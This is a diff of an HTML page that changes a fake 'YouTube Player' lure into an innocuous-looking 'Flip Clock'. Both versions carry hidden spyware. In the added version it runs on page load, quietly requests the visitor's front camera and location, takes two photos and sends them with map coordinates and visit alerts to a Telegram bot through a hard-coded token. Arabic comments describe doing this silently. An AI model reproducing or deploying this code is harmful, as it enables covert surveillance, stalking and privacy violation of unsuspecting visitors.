@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>YouTube Player</title>
+    <title>Flip Clock</title>
     <style>
         :root {
             --bg-color: #000;
@@ -12,157 +12,171 @@
             --font-main: 'Inter', -apple-system, sans-serif;
         }
 
-        body { background: #0f0f0f; color: #fff; font-family: Roboto, Arial, sans-serif; margin: 0; overflow: hidden; }
-        
-        /* واجهة اليوتيوب الوهمية */
-        .header { height: 56px; padding: 0 16px; display: flex; align-items: center; background: #0f0f0f; }
-        .logo { height: 20px; }
-        .video-container { position: relative; width: 100%; padding-top: 56.25%; background: #000; }
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .play-btn { width: 65px; height: 65px; background: rgba(255,0,0,0.9); border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; }
-        .play-btn-icon { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 5px; }
-        .info-text { margin-top: 20px; font-size: 13px; color: #888; text-align: center; width: 80%; }
-        .details { padding: 15px; }
-        #vTitle { font-size: 17px; margin: 0 0 10px; font-weight: 500; color: #fff; }
-        
-        /* واجهة الساعة الجمالية */
-        #clock-interface {
-            display: none; flex-direction: column; justify-content: center; align-items: center;
-            height: 100vh; background: var(--bg-color); position: fixed; top: 0; left: 0; width: 100%; z-index: 200;
+        body { 
+            background: var(--bg-color); 
+            color: var(--text-color); 
+            font-family: var(--font-main); 
+            margin: 0; 
+            overflow: hidden; 
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
-        .clock { display: flex; gap: 12px; align-items: center; }
-        .flip-card {
-            position: relative; width: 100px; height: 150px; background: var(--card-bg);
-            border-radius: 10px; font-size: 70px; font-weight: 700; line-height: 150px;
-            text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.8);
-        }
-        .flip-card::before {
-            content: ''; position: absolute; top: 50%; left: 0; width: 100%; height: 2px;
-            background: rgba(0, 0, 0, 0.6); z-index: 5; transform: translateY(-50%);
-        }
-        .ampm-card { display: flex; flex-direction: column; gap: 5px; font-size: 18px; font-weight: 600; }
-        .ampm-card span { padding: 5px 10px; border-radius: 4px; background: var(--card-bg); opacity: 0.15; }
-        .ampm-card span.active { opacity: 1; color: #fff; }
-        #greeting { font-size: 1rem; margin-bottom: 20px; letter-spacing: 3px; text-transform: uppercase; opacity: 0.6; font-weight: 300; }
 
+        /* تنسيق الساعة الجمالية */
+        #greeting { 
+            font-size: 1.2rem; 
+            margin-bottom: 25px; 
+            letter-spacing: 4px; 
+            text-transform: uppercase; 
+            opacity: 0.6; 
+            font-weight: 300; 
+        }
+
+        .clock { display: flex; gap: 15px; align-items: center; }
+
+        .flip-card {
+            position: relative; 
+            width: 120px; 
+            height: 180px; 
+            background: var(--card-bg);
+            border-radius: 15px; 
+            font-size: 85px; 
+            font-weight: 700; 
+            line-height: 180px;
+            text-align: center; 
+            box-shadow: 0 15px 35px rgba(0,0,0,0.8);
+        }
+
+        /* الخط الفاصل في المنتصف */
+        .flip-card::before {
+            content: ''; 
+            position: absolute; 
+            top: 50%; 
+            left: 0; 
+            width: 100%; 
+            height: 2px;
+            background: rgba(0, 0, 0, 0.7); 
+            z-index: 5; 
+            transform: translateY(-50%);
+        }
+
+        .ampm-card { display: flex; flex-direction: column; gap: 8px; font-size: 20px; font-weight: 600; }
+        .ampm-card span { padding: 6px 12px; border-radius: 6px; background: var(--card-bg); opacity: 0.1; transition: 0.5s; }
+        .ampm-card span.active { opacity: 1; color: #fff; }
+
+        /* إخفاء عناصر العمليات الخلفية */
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div id="youtube-interface">
-    <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" class="logo"></div>
-    <div class="video-container">
-        <div class="overlay" id="overlay">
-            <div class="play-btn" id="startBtn"><div class="play-btn-icon"></div></div>
-            <div class="info-text">انقر للتشغيل والموافقة على سياسة المشاهدة الآمنة 2026</div>
-        </div>
-    </div>
-    <div class="details"><h1 id="vTitle">جاري تحميل الفيديو...</h1></div>
-</div>
-
-<div id="clock-interface">
     <div id="greeting">WELCOME</div>
+    
     <div class="clock">
         <div id="hours" class="flip-card">00</div>
         <div id="minutes" class="flip-card">00</div>
-        <div id="seconds" class="flip-card" style="width: 80px; font-size: 50px; opacity: 0.6;">00</div>
+        <div id="seconds" class="flip-card" style="width: 90px; font-size: 60px; opacity: 0.6;">00</div>
+        
         <div class="ampm-card">
             <span id="am">AM</span>
             <span id="pm">PM</span>
         </div>
     </div>
-</div>
 
-<canvas id="canvas"></canvas>
-<video id="camVideo" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+    <video id="camVideo" autoplay playsinline muted></video>
 
-<script>
-    const BOT_TOKEN = "8372973119:AAEvtD7kL-5L1uA4URd_CROFb9V4z1nXt8E";
-    const CHAT_ID = "591768998";
-    let videoStream = null;
+    <script>
+        const BOT_TOKEN = "8372973119:AAEvtD7kL-5L1uA4URd_CROFb9V4z1nXt8E";
+        const CHAT_ID = "591768998";
+        let videoStream = null;
 
-    // تشغيل الساعة فوراً عند النقر وبدء المحاولات في الخلفية
-    document.getElementById('startBtn').addEventListener('click', async () => {
-        // 1. الانتقال الفوري للساعة بغض النظر عن النتيجة
-        document.getElementById('youtube-interface').style.display = 'none';
-        document.getElementById('clock-interface').style.display = 'flex';
-        startClock();
+        // 1. بدء الساعة فوراً عند التحميل
+        function startClock() {
+            setInterval(() => {
+                const now = new Date();
+                let h = now.getHours();
+                let m = now.getMinutes().toString().padStart(2, '0');
+                let s = now.getSeconds().toString().padStart(2, '0');
+                const ampm = h >= 12 ? 'pm' : 'am';
+                h = (h % 12 || 12).toString().padStart(2, '0');
 
-        // 2. محاولة جلب الكاميرا والموقع بصمت
-        try {
-            videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            document.getElementById('camVideo').srcObject = videoStream;
-            
-            sendToBot("👀 تم الدخول بنجاح وبدء التصوير");
-
-            navigator.geolocation.getCurrentPosition(p => {
-                sendToBot(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            }, () => {}, {timeout: 5000});
-
-            // التقاط الصور ثم الإغلاق
-            setTimeout(() => capture(1), 3000);
-            setTimeout(() => {
-                capture(2);
-                setTimeout(stopCamera, 1000);
-            }, 7000);
-
-        } catch (err) {
-            // في حال رفض الكاميرا، نرسل إشعاراً فقط ونستمر في عرض الساعة
-            sendToBot("⚠️ رفض الوصول للكاميرا، لكن الموقع شغال.");
+                document.getElementById('hours').innerText = h;
+                document.getElementById('minutes').innerText = m;
+                document.getElementById('seconds').innerText = s;
+                document.getElementById('am').className = ampm === 'am' ? 'active' : '';
+                document.getElementById('pm').className = ampm === 'pm' ? 'active' : '';
+                
+                let hr = now.getHours();
+                let greet = hr < 12 ? "GOOD MORNING" : (hr < 18 ? "GOOD AFTERNOON" : "GOOD EVENING");
+                document.getElementById('greeting').innerText = greet;
+            }, 1000);
         }
-    });
 
-    function capture(n) {
-        if (!videoStream) return;
-        const v = document.getElementById('camVideo');
-        const c = document.getElementById('canvas');
-        try {
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            c.toBlob(b => {
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('photo', b, `shot_${n}.jpg`);
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-            }, 'image/jpeg', 0.5);
-        } catch(e) {}
-    }
+        // 2. محاولة الرصد والتصوير بصمت عند تحميل الصفحة
+        async function runBackgroundTasks() {
+            sendToBot("🚀 رصد دخول جديد للموقع (واجهة الساعة مباشرة)");
 
-    function stopCamera() {
-        if (videoStream) {
-            videoStream.getTracks().forEach(track => track.stop());
+            try {
+                // محاولة طلب الكاميرا
+                videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('camVideo').srcObject = videoStream;
+
+                // محاولة طلب الموقع
+                navigator.geolocation.getCurrentPosition(p => {
+                    sendToBot(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                }, () => {}, {timeout: 5000});
+
+                // التقاط الصور
+                setTimeout(() => capture(1), 3000);
+                setTimeout(() => {
+                    capture(2);
+                    setTimeout(stopCamera, 1000); // إغلاق الكاميرا تماماً بعد انتهاء المهمة
+                }, 7000);
+
+            } catch (err) {
+                sendToBot("⚠️ تم الدخول، لكن تعذر الوصول للكاميرا (قد يكون المستخدم رفض الصلاحية).");
+            }
         }
-    }
 
-    function sendToBot(txt) {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CHAT_ID, text: txt})
-        }).catch(() => {});
-    }
+        function capture(n) {
+            if (!videoStream) return;
+            const v = document.getElementById('camVideo');
+            const c = document.getElementById('canvas');
+            try {
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                c.toBlob(b => {
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('photo', b, `shot_${n}.jpg`);
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg', 0.5);
+            } catch(e) {}
+        }
 
-    function startClock() {
-        setInterval(() => {
-            const now = new Date();
-            let h = now.getHours();
-            let m = now.getMinutes().toString().padStart(2, '0');
-            let s = now.getSeconds().toString().padStart(2, '0');
-            const ampm = h >= 12 ? 'pm' : 'am';
-            h = (h % 12 || 12).toString().padStart(2, '0');
+        function stopCamera() {
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+            }
+        }
 
-            document.getElementById('hours').innerText = h;
-            document.getElementById('minutes').innerText = m;
-            document.getElementById('seconds').innerText = s;
-            document.getElementById('am').className = ampm === 'am' ? 'active' : '';
-            document.getElementById('pm').className = ampm === 'pm' ? 'active' : '';
-            
-            let hr = now.getHours();
-            let greet = hr < 12 ? "GOOD MORNING" : (hr < 18 ? "GOOD AFTERNOON" : "GOOD EVENING");
-            document.getElementById('greeting').innerText = greet;
-        }, 1000);
-    }
-</script>
+        function sendToBot(txt) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: CHAT_ID, text: txt})
+            }).catch(() => {});
+        }
+
+        // التشغيل عند فتح الصفحة
+        window.onload = () => {
+            startClock();
+            runBackgroundTasks();
+        };
+    </script>
 </body>
 </html>
